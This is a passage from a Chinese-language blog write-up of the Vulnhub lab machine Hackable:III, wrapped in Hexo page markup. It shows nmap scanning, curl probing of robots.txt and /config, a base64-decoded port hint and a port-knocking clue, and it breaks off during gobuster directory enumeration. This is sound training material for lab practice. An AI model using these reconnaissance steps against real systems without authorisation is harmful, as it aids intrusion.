@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Vulnhub-Hackable:III靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-Hackable:III">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/64270.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="Vulnhub-Hackable:III靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67ab14c4d0e0a243d4fe55ca.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67ab377ad0e0a243d4fe613a.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67ab4752d0e0a243d4fe6489.png">
+<meta property="article:published_time" content="2025-02-11T08:27:23.000Z">
+<meta property="article:modified_time" content="2025-02-11T13:09:00.822Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67ab14c4d0e0a243d4fe55ca.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/64270.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Vulnhub-Hackable:III | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/64270.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub-Hackable:III
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-11 16:27:23 / 修改时间：21:09:00" itemprop="dateCreated datePublished" datetime="2025-02-11T16:27:23+08:00">2025-02-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67ab0a13d0e0a243d4fe51a1.png" class="img-topic">
+        </div>
+      
+      
+        <p>Vulnhub-Hackable:III靶机复盘</p>
+<span id="more"></span>
+
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.164    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">11</span> <span class="number">17</span>:<span class="number">01</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line">Host is up (<span class="number">0.0030</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> filtered ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open     http    Apache httpd <span class="number">2.4</span>.<span class="number">46</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-title:</span> Kryptos <span class="operator">-</span> LAN Home</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.46</span> (Ubuntu)</span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/config</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.98</span> ms <span class="number">192.168</span>.<span class="number">179.164</span> (<span class="number">192.168</span>.<span class="number">179.164</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.08</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>没有什么多多余的信息了，只开放80和22,但是22端口是filtered，大概率要knock  去web看看</p>
+<h1 id="web-探测"><a href="#web-探测" class="headerlink" title="web 探测"></a>web 探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164                      </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;pt-br&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://fonts.googleapis.com/css?family=RocknRoll+One&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/file.css&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Kryptos - LAN Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-open&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;imagens/logo_menu.png&quot;</span> <span class="attr">width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">height</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;overlay&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;menu&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;menu-close&quot;</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;login_page/login.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>出现了一个jubiscleudo的用户名，然后说确实要用knock来打开端口，以及有一个.jpg他需要批准<br>访问一下robots.txt发现有东西！</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164/robots.txt</span><br><span class="line">User-Agente: *</span><br><span class="line">Disallow: /config</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.164/config    </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The document has moved <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.179.164/config/&quot;</span>&gt;</span>here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.46 (Ubuntu) Server at 192.168.179.164 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67ab14c4d0e0a243d4fe55ca.png"><br>web中访问有一个base64加密过的文本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">echo</span> <span class="string">&quot;MTAwMDA=&quot;</span> | <span class="built_in">base64</span> -d                                                </span><br><span class="line">10000 </span><br></pre></td></tr></table></figure></div>
+<p>只给了一个端口，先扫一下目录吧</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># gobuster dir -u 192.168.179.164 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -x html,php,jpg,wbpg      </span></span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Gobuster v3.<span class="number">6</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Url:</span>                     http:<span class="symbol">//192.168.179.164</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Method:</span>                  GET</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Threads:</span>                 <span class="number">10</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Wordlist:</span>                <span class="symbol">/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt</span></span><br><span class="line">[<span class="operator">+</span>] Negative Status <span class="params">codes:</span>   <span class="number">404</span></span><br><span class="line">[<span class="operator">+</span>] User <span class="params">Agent:</span>              gobuster<span class="symbol">/3.6</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Extensions:</span>              php,jpg,wbpg,html</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Timeout:</span>                 <span class="number">10</span>s</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line"><span class="symbol">/login.php</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">487</span>]</span><br><span class="line"><span class="symbol">/index.html</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/config.php</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">507</span>]</span><br><span class="line"><span class="symbol">/.htaccess</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.htaccess.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/robots.txt</span>           (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">33</span>]</span><br><span class="line"><span class="symbol">/.</span>                    (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">1095</span>]</span><br><span class="line"><span class="symbol">/home.html</span>            (<span class="params">Status:</span> <span class="number">200</span>) [<span class="params">Size:</span> <span class="number">11327</span>]</span><br><span class="line"><span class="symbol">/.html</span>                (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.wbpg</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.php</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.jpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span class="symbol">/.html.html</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">280</span>]</span><br><span class="line"><span 